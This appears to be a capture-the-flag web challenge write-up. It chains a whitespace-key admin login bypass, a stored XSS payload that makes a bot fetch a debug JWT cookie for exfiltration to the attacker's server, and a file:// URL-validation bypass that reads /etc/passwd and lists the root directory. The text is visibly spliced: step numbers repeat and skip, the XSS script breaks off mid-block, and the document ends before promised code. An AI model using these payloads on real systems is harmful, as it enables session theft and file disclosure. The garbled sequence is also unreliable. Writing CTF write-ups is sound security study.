    Step 1: Where is the Flag?

    Looking at the provided files, the location of the flag was completely unknown—whether it was stored in a file or a variable, it literally wasn’t there. So I asked the challenge author, and it turned out the flag is located in the root directory (/) with the filename <random_str>.txt.

    Step 2: Privillege Escallation to Admin

    Register at /api/auth/register

    Login at /api/auth/login

    Analysis:
    In the register function, data from req.body is directly pushed to the users array. As it turns out, there is no proper validation there, so if we send a payload like {" email": "admin"} (notice the leading space in the key), it still gets pushed into the array without further checks.

    Moving on to the login function: here, it loops through every user data entry and checks the email and password fields. But uniquely, before checking, all keys are trim()ed. Meaning, if there is a key " email" (with a leading space), it will become "email" when checked.

    Because we previously succeeded in inserting the data {" email": "admin"}, during the login process, the " email" key will be trimmed to "email", and its value will be captured as "admin". The system assumes we are logging in as admin and ultimately grants us a JWT token with the admin role.

    Step 4: Get debug_mode=true JWT Token via XSS + SSRF

    At the /api/auth/init endpoint, we can obtain a JWT token that has debug_mode: true. However, this token is only granted if the entity accessing the endpoint is recognized as a “local user”.

    Since we found a stored XSS vulnerability and the bot executes actions as a local user, we can force the bot to access /api/auth/init. As a result, the bot will receive a user cookie containing a JWT token with debug_mode: true. From there, we just need to exfiltrate that cookie via XSS back to our own server.

    Here is the XSS script payload:

    <script>
(async () => {

    await open("/api/auth/init");
    // Delay for 2 seconds to ensure processing completes
    await new Promise((resolve) => setTimeout(resolve, 2000));

    Why use open("/api/auth/init") instead of a direct fetch("/api/auth/init")?

    The server checks the Sec-Fetch-Mode header. If we use fetch(), the browser automatically sets Sec-Fetch-Mode: cors, causing the server to block the request. However, using open() forces the browser to open a new context, changing the header to Sec-Fetch-Mode: navigate. The server considers this valid, allowing us to bypass the protection and successfully obtain the debug_mode: true cookie.

    Step 5: Local File Read

    Access to the /api/runtest endpoint is restricted to admins, and this validation is verified using the JWT token supplied in the Authorization header.

    Curiously, this endpoint also performs an additional check for debug_mode. Instead of extracting debug_mode from the Authorization header, it extracts it from the user cookie. If the cookie doesn’t exist, it falls back to the JWT in the header.

    This means two distinct JWT sources are processed here:

    1. Authorization Header: Verifies if we possess the admin role.
    2. User Cookie: Verifies if debug_mode is set to true.

    Armed with both tokens, we can abuse the /api/runtest endpoint to read arbitrary local files from the bot’s system. To do this, we must first bypass the URL validation layers.

    The application uses two layers of verification to ensure the URL points to localhost:

    if (!url.includes("http://localhost")) {
    return res.status(400).json({ message: "URL must be localhost" });
}

    This block only checks for the literal string "http://localhost" anywhere within the URL structure. We can bypass this check using a URL fragment scheme: file:///etc/passwd#http://localhost.

    Next, the second validation layer checks the parsed hostname:

    const urlP = new URL(url);
if (urlP.hostname) {
    if (!["localhost", "127.0.0.1"].includes(urlP.hostname)) {
        return res.status(400).json({ message: "URL must be localhost" });
    }
}

    Because we are passing the payload file:///etc/passwd#http://localhost, the urlP.hostname resolves to an empty string (since the file:// scheme does not utilize a traditional hostname component). As a result, this second validation block is skipped entirely.

    Consequently, the bot executes:

    await page.goto("file:///etc/passwd#http://localhost")

    The contents of /etc/passwd will be read by the bot and appended directly to the array:

    AuthHandler.users.push({
    email: user.email,
    password: "dbgpass1234",
    debug_mode: false,
    log: content, // <- The contents of /etc/passwd are saved here
});

    We can subsequently review the output logs simply by logging back into our account using our email address and the password dbgpass1234.

    Step 6: Directory Listing via View-source Protocol

    While we can read local files via the file:// scheme, the actual flag filename is completely randomized. Guessing it blindly would be virtually impossible.

    However, research into headless browser file-read vectors revealed an intriguing trick regarding the behavior of the view-source: protocol (reference: Arbitrary File Read Tricks with Headless Browsers).

    In headless instances, referencing view-source:file:/// forces the engine to render the directory structure of the filesystem root path (/).

    Step 2: Huh? A Bot?? Could it Be XSS??

    There is an active bot simulation in this environment, which suggests we need to perform client-side exploitation, such as Cross-Site Scripting (XSS).

    In this challenge, the bot acts as an administrator. Its workflow is as follows:

    1. Log in as an admin (username: ilsya).
    2. Visit /admin.
    3. Extract all <a href> elements in the HTML that contain the string /admin.
    4. Systematically visit every discovered /admin/... link.

    The bot’s structural implementation looks like this:
